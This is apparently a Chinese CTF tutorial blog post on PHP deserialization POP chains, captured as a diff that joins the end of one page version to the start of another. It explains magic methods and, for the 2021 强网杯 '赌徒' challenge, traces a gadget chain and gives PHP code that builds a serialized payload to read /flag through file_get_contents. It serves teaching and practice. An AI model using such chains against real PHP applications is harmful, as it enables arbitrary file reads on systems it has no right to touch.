-</span></span></span></code></pre></div><p>分析：首先依然是找到头和尾，头部依然是一个GET传参，而尾部可以看到Room类中有个<code>Get_hint()</code>方法，里面有一个<code>file_get_contents</code>，可以实现任意文件读取，我们就可以利用这个读取<code>flag</code>文件了，然后就是往前倒推，Room类中<code>__invoke()</code>方法调用了<code>Get_hint()</code>，然后Room类的<code>__get()</code>里面有个<code>return $function()</code>可以调用<code>__invoke()</code>，再往前看，Info类中的<code>__toString()</code>中有Room类中不存在的属性，所以可以调用<code>__get()</code>，然后Start类中有个<code>_sayhello()</code>可以调用<code>__toString()</code>，然后在Start类中<code>__wakeup()</code>方法中直接调用了<code>_sayhello()</code>，而我们知道的是，输入字符串之后就会先进入<code>__wakeup()</code>，这样头和尾就连上了</p><p>头 -> Start::__wakeup() -> Start::_sayhello() -> Info::__toString() -> Room::__get() -> Room::invoke() -> Room::Get_hint()</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Start</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;guest&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$flag</span><span class=o>=</span><span class=s1>&#39;syst3m(&#34;cat 127.0.0.1/etc/hint&#34;);&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Info</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>	<span class=k>private</span> <span class=nv>$phonenumber</span><span class=o>=</span><span class=mi>123123</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$promise</span><span class=o>=</span><span class=s1>&#39;I do&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>	
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>promise</span><span class=o>=</span><span class=s1>&#39;I will not !!!!&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>promise</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Room</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filename</span><span class=o>=</span><span class=s1>&#39;/flag&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$sth_to_set</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$a</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Start</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Info</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Room</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$d</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Room</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>-&gt;</span> <span class=na>name</span> <span class=o>=</span> <span class=nv>$b</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>-&gt;</span> <span class=na>file</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$c</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>-&gt;</span> <span class=na>a</span> <span class=o>=</span> <span class=nv>$d</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-11-21</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><button title="分享到 Twitter" data-sharer=twitter data-url=https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/ data-title=[反序列化]POP链 data-hashtags=反序列化,PHP><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer=facebook data-url=https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/ data-hashtag=反序列化><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 WhatsApp" data-sharer=whatsapp data-url=https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/ data-title=[反序列化]POP链 data-web><span class="fab fa-whatsapp fa-fw"></span></button><button title="分享到 Line" data-sharer=line data-url=https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/ data-title=[反序列化]POP链><span data-svg-src=/lib/simple-icons/icons/line.min.svg></span></button><button title="分享到 微博" data-sharer=weibo data-url=https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/ data-title=[反序列化]POP链><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Myspace" data-sharer=myspace data-url=https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/ data-title=[反序列化]POP链 data-description><span data-svg-src=/lib/simple-icons/icons/myspace.min.svg></span></button><button title="分享到 Blogger" data-sharer=blogger data-url=https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/ data-title=[反序列化]POP链 data-description><span class="fab fa-blogger fa-fw"></span></button><button title="分享到 Evernote" data-sharer=evernote data-url=https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/ data-title=[反序列化]POP链><span class="fab fa-evernote fa-fw"></span></button></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>反序列化</a>,&nbsp;<a href=/tags/php/>PHP</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav></div></div><div id=comments></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2023 - 2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
-</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><div id=cookieconsent-container></div><div class=assets><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/katex/copy-tex.min.css><noscript><link rel=stylesheet href=/lib/katex/copy-tex.min.css></noscript><link rel=stylesheet href=/lib/cookieconsent/cookieconsent.min.css><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},cookieconsent:{content:{dismiss:"同意",link:"了解更多",message:"本网站使用 Cookies 来改善您的浏览体验."},enable:!0,palette:{button:{background:"#f0f0f0"},popup:{background:"#1aa3ff"}},theme:"edgeless"},data:{"desktop-header-typeit":"Nexuzzz0's BLOG","mobile-header-typeit":"Nexuzzz0's BLOG"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{distance:100,findAllMatches:!1,highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,useExtendedSearch:!1},sharerjs:!0,table:{sort:!0},typeit:{cursorChar:"|",cursorSpeed:1e3,data:{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},duration:-1,speed:100}}</script><script type=text/javascript src=/lib/tablesort/tablesort.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/typeit/typeit.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js defer></script><script type=text/javascript src=/lib/katex/auto-render.min.js defer></script><script type=text/javascript src=/lib/katex/copy-tex.min.js defer></script><script type=text/javascript src=/lib/katex/mhchem.min.js defer></script><script type=text/javascript src=/js/katex.min.js defer></script><script type=text/javascript src=/lib/cookieconsent/cookieconsent.min.js defer></script><script type=text/javascript src=/js/cookieconsent.min.js defer></script><script type=text/javascript src=/js/theme.min.js defer></script></div></body></html>
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>[反序列化]POP链 - Nexuzzz0</title><meta name="Description" content="Nexuzzz0&#39;s BLOG"><meta property="og:title" content="[反序列化]POP链" />
+<meta property="og:description" content="[反序列化]构造POP链在学习如何构造反序列化之前我们要先了解一下常用的魔术方法及其触发条件 反序列化中常见的魔术方法__wakeup() //" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" /><meta property="og:image" content="https://nexuzzz0.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-21T17:01:54+08:00" />
+<meta property="article:modified_time" content="2023-11-21T17:01:54+08:00" /><meta property="og:site_name" content="Nexuzzz0&#39;s BLOG" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nexuzzz0.github.io/logo.png"/>
+
+<meta name="twitter:title" content="[反序列化]POP链"/>
+<meta name="twitter:description" content="[反序列化]构造POP链在学习如何构造反序列化之前我们要先了解一下常用的魔术方法及其触发条件 反序列化中常见的魔术方法__wakeup() //"/>
+<meta name="application-name" content="Nexuzzz0&#39;s BLOG">
+<meta name="apple-mobile-web-app-title" content="Nexuzzz0&#39;s BLOG">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[反序列化]POP链",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/nexuzzz0.github.io\/posts\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE\/"
+        },"genre": "posts","keywords": "反序列化, PHP","wordcount":  5379 ,
+        "url": "https:\/\/nexuzzz0.github.io\/posts\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE\/","datePublished": "2023-11-21T17:01:54+08:00","dateModified": "2023-11-21T17:01:54+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nexuzzz0"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Nexuzzz0"><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Nexuzzz0"><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#反序列化中常见的魔术方法">反序列化中常见的魔术方法</a>
+      <ul>
+        <li><a href="#__construct-和-__destruct"><code>__construct()</code> 和 <code>__destruct()</code></a></li>
+        <li><a href="#__sleep-和-__wakeup"><code>__sleep()</code> 和 <code>__wakeup()</code></a></li>
+        <li><a href="#__tostring"><code>__toString()</code></a></li>
+        <li><a href="#__invoke"><code>__invoke()</code></a></li>
+        <li><a href="#__get-和-__set"><code>__get()</code> 和 <code>__set()</code></a></li>
+        <li><a href="#__call-和-__callstatic"><code>__call()</code> 和 <code>__callStatic()</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#pop链">POP链</a>
+      <ul>
+        <li><a href="#构造思路">构造思路</a></li>
+        <li><a href="#构造小技巧">构造小技巧</a></li>
+        <li><a href="#例题1level-0">例题1——Level 0</a></li>
+        <li><a href="#例题2level-1">例题2——Level 1</a></li>
+        <li><a href="#例题3mrctf2020ezpop">例题3——[MRCTF2020]Ezpop</a></li>
+        <li><a href="#例题42021-强网杯-赌徒">例题4——2021 强网杯 赌徒</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[反序列化]POP链</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Nexuzzz0</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-21">2023-11-21</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-11-21">2023-11-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5379 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 11 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#反序列化中常见的魔术方法">反序列化中常见的魔术方法</a>
+      <ul>
+        <li><a href="#__construct-和-__destruct"><code>__construct()</code> 和 <code>__destruct()</code></a></li>
+        <li><a href="#__sleep-和-__wakeup"><code>__sleep()</code> 和 <code>__wakeup()</code></a></li>
+        <li><a href="#__tostring"><code>__toString()</code></a></li>
+        <li><a href="#__invoke"><code>__invoke()</code></a></li>
+        <li><a href="#__get-和-__set"><code>__get()</code> 和 <code>__set()</code></a></li>
+        <li><a href="#__call-和-__callstatic"><code>__call()</code> 和 <code>__callStatic()</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#pop链">POP链</a>
+      <ul>
+        <li><a href="#构造思路">构造思路</a></li>
+        <li><a href="#构造小技巧">构造小技巧</a></li>
+        <li><a href="#例题1level-0">例题1——Level 0</a></li>
+        <li><a href="#例题2level-1">例题2——Level 1</a></li>
+        <li><a href="#例题3mrctf2020ezpop">例题3——[MRCTF2020]Ezpop</a></li>
+        <li><a href="#例题42021-强网杯-赌徒">例题4——2021 强网杯 赌徒</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="反序列化构造pop链" class="headerLink">
+    <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0pop%e9%93%be" class="header-mark"></a>[反序列化]构造POP链</h1><p>在学习如何构造反序列化之前我们要先了解一下常用的魔术方法及其触发条件</p>
+<h2 id="反序列化中常见的魔术方法" class="headerLink">
+    <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%ad%e5%b8%b8%e8%a7%81%e7%9a%84%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95" class="header-mark"></a>反序列化中常见的魔术方法</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">__wakeup() //将在字符串被反序列化之后被立即调用，就是说看到unserialize后就会被立即调用
+</span></span><span class="line"><span class="cl">__sleep() //执行serialize()时，先会调用这个函数，用于指定哪些指令会被序列化保存下来
+</span></span><span class="line"><span class="cl">__construct() //当对象创建时会自动调用(但在unserialize()时是不会自动调用的)
+</span></span><span class="line"><span class="cl">__destruct() //对象被销毁时自动调用
+</span></span><span class="line"><span class="cl">__call() //在对象上下文中调用不可访问(不存在)的方法时触发
+</span></span><span class="line"><span class="cl">__callStatic() //在静态上下文中调用不可访问的方法时触发
+</span></span><span class="line"><span class="cl">__get() //用于从不可访问的属性读取数据或者不存在的类属性时都会调用此方法
+</span></span><span class="line"><span class="cl">__set() //用于将数据写入不可访问的属性
+</span></span><span class="line"><span class="cl">__isset() //在不可访问的属性上调用isset()或empty()触发
+</span></span><span class="line"><span class="cl">__unset() //在不可访问的属性上使用unset()时触发
+</span></span><span class="line"><span class="cl">__toString() //当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用
+</span></span><span class="line"><span class="cl">__invoke() //当尝试将对象调用为函数时触发
+</span></span></code></pre></div><p>在我们的攻击中，反序列化函数<code>unserialize()</code>是我们攻击的入口，也就是说，只要这个参数可控，<strong>我们就能传入任何的已经序列化的对象</strong>（只要这个类在当前作用域存在我们就可以利用），而不是局限于出现<code>unserialize()</code>函数的类的对象，如果只能局限于当前类，那我们的攻击面也太狭小了，这个类不调用危险的方法我们就没法发起攻击。</p>
+<p>但是我们又知道，你反序列化了其他的类对象以后我们只是控制了是<strong>属性</strong>，如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为我们有魔术方法。</p>
+<p>魔术方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p>
+<h3 id="__construct-和-__destruct" class="headerLink">
+    <a href="#__construct-%e5%92%8c-__destruct" class="header-mark"></a><code>__construct()</code> 和 <code>__destruct()</code></h3><p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p>
+<p><code>__destruct()</code>：当对象被销毁时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用<code>__construct</code>后一定会调用<code>__destruct</code>；或者我们直接传入一个对象，它后面被销毁时也会调用<code>__destruct</code></p>
+<p>可以看到，创建对象e时调用了<code>__construct</code>，然后输出序列化后的对象<code>t</code>，最后在销毁对象<code>t</code>时调用了<code>__destruct</code></p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>再看这个，我们没有创建对象，而是直接传入了一个对象，所以说它没有调用<code>__construct</code>却调用了<code>__destruct</code></p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>最后看这个，因为我们既创建了对象<code>t</code>，也传入了对象，所以说它<code>__destruct</code>被调用了两次，因为它两个对象最后都会被销毁</p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="__sleep-和-__wakeup" class="headerLink">
+    <a href="#__sleep-%e5%92%8c-__wakeup" class="header-mark"></a><code>__sleep()</code> 和 <code>__wakeup()</code></h3><p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p>
+<p><code>__wakeup()</code>: 将在<strong>字符串被反序列化之后被立即调用</strong>，就是说<strong>看到</strong><code>unserialize</code><strong>后就会被立即调用</strong></p>
+<p>在看到<code>serialize($b)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>直接输入了字符串，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高
+<figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="__tostring" class="headerLink">
